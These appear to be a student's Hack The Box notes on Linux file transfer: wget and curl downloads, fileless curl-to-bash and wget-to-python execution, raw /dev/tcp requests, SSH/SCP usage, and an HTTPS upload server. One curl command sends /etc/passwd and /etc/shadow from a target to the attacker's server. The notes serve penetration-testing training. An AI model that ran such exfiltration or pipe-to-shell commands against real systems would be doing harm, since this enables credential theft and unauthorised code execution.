

#### Download a File Using wget

```shell-session
s0nam@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

#### Download a File Using cURL

```shell-session
s0nam@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## Fileless Attacks Using Linux

#### Fileless Download with cURL

```shell-session
s0nam@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget

```shell-session
s0nam@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```


-----

## Download with Bash (/dev/tcp)

#### Connect to the Target Webserver

```shell-session
s0nam@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
s0nam@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
s0nam@htb[/htb]$ cat <&3
```


---
## SSH Downloads



### Start / enable SSH server

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
sudo systemctl status ssh
```

Enable (start at boot), start now, and check status of the SSH daemon.

---

### Check listening ports / connectivity

```bash
netstat -lnpt
# or (preferred modern tool)
ss -lnpt
```

Show listening TCP ports and the processes (use root for full info).

---

### Connect to a remote host with SSH

```bash
ssh user@host
ssh -p 2222 user@host         # use nonstandard port 2222
ssh -i /path/to/key user@host # use a private key file
```

Open an encrypted remote shell; `-p` specifies port, `-i` specifies identity (key).

---

### Generate an SSH keypair

```bash
ssh-keygen -t ed25519 -C "you@example.com"
```

Create a public/private keypair for key-based authentication.

---

### Copy your public key to the remote host

```bash
ssh-copy-id user@host
```

Installs your `~/.ssh/id_*.pub` into the remote user's `~/.ssh/authorized_keys` for passwordless login.

---

### Secure copy (SCP) — download remote → local

```bash
scp user@remote:/path/to/remote-file /local/path
scp user@remote:/root/myroot.txt .
```

Copy files over SSH; trailing `.` saves to current directory.

---
----

# web uploads
# Install uploadserver

```bash
sudo python3 -m pip install --user uploadserver
```

# Create a self-signed certificate (cert + key in server.pem)

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

# Create web directory and start HTTPS upload server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

# Upload files from the target to your server (use --insecure for self-signed cert)

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```


---
## Alternative Web File Transfer Method

- Start a tiny web server on the machine **that has the file** and pull it from the other machine with `wget`/`curl`.
    
- Or start the server on your machine and have the remote host push/pull from you.
    

---

### Common one‑liners (server side)

- Python 3: `python3 -m http.server` (port 8000)
    
- Python 2: `python2 -m SimpleHTTPServer`
    
- PHP: `php -S 0.0.0.0:8000`
    
- Ruby: `ruby -run -ehttpd . -p8000`
    

Client to download:

- `wget http://HOST:8000/file`
    
- `curl -O http://HOST:8000/file`
    

---

### Which side runs the server?

- **Server = host that has the file**.
    
- **Client = host that wants to download** (runs `wget`/`curl`).
    
- Reverse roles if you want the compromised host to fetch from your machine.
    

---

